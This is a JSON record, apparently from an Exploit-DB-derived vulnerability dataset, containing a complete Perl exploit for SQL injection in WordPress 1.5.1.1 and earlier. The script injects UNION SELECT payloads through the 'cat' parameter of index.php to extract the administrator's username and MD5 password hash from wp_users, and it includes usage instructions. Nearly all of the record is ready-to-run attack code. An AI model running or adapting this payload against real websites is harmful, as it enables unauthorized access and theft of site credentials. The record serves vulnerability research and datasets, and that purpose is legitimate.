{
  "id": "1033",
  "title": "WordPress Core 1.5.1.1 - SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n#\r\n# SQL Injection Exploit for WordPress <= 1.5.1.1\r\n# This exploit shows the username of the administrator of the blog and his\r\n# password crypted in MD5, you must only choose the correct version of the target\r\n# Related advisory: http://www.gentoo.org/security/en/glsa/glsa-200506-04.xml\r\n# Patch: download the last version at http://wordpress.org/download/\r\n# Coded by Alberto Trivero\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n\\t====================================\\n\";\r\nprint \"\\t= Exploit for WordPress <= 1.5.1.1 =\\n\";\r\nprint \"\\t=        by Alberto Trivero        =\\n\";\r\nprint \"\\t====================================\\n\\n\";\r\n\r\nif(!$ARGV[0] or !($ARGV[0]=~m/http/) or !($ARGV[1]==1 or $ARGV[1]==2)) {\r\n   print \"Usage:\\nperl $0 [full_target_path] [target_version: 1 OR 2]\\nVersion 1: WordPress <= 1.5\\nVersion 2: WordPress 1.5.1 - 1.5.1.1\\n\\n\";\r\n   print \"Examples:\\nperl $0 http://www.example.com/wordpress/ 2\\n\";\r\n   exit(0);\r\n}\r\n\r\n$page=get($ARGV[0].\"index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*\") || die \"[-] Unable to retrieve: $!\" if($ARGV[1]==1);\r\n$page=get($ARGV[0].\"index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*\") || die \"[-] Unable to retrieve: $!\" if($ARGV[1]==2);\r\nprint \"[+] Connected to: $ARGV[0]\\n\";\r\n$page=~m/:([a-f0-9]{32}):(.*?):/;\r\nprint \"[+] Username of administrator is: $2\\n\" if($2);\r\nprint \"[+] MD5 hash of password is: $1\\n\" if($1);\r\nprint \"[-] Unable to retrieve username\\n\" if(!$2);\r\nprint \"[-] Unable to retrieve hash of password\\n\" if(!$1);\r\n\r\n# milw0rm.com [2005-06-22]",
  "url": "https://www.exploit-db.com/exploits/1033"
}